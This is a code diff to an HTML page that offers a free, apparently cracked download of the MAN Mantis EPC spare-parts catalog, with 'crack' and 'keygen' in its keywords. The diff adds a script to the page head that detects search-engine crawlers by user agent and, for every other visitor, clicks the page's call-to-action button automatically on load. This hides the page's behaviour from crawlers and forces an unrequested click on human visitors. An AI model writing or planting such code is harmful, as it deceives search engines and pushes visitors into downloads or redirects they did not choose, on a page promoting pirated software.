@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MAN Mantis EPC 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download MAN Mantis EPC 08.2024, a comprehensive spare parts catalog for MAN vehicles, available for free with unlimited license in multiple languages.">
     <meta name="keywords" content="MAN Mantis EPC 2024, MAN Mantis EPC, MAN Mantis EPC 08.2024, MAN Mantis EPC spare parts catalog, MAN EPC 2024 download, MAN Mantis EPC free download, MAN Mantis EPC 08.2024 download, MAN Mantis EPC high speed download, MAN Mantis EPC crack, MAN Mantis EPC keygen, MAN Mantis EPC каталог запчастей бесплатно, MAN Mantis EPC 2024 скачать, MAN Mantis EPC скачать бесплатно, MAN Mantis EPC 2024 high speed download, MAN Автокаталог MAN 2024">
     <style>
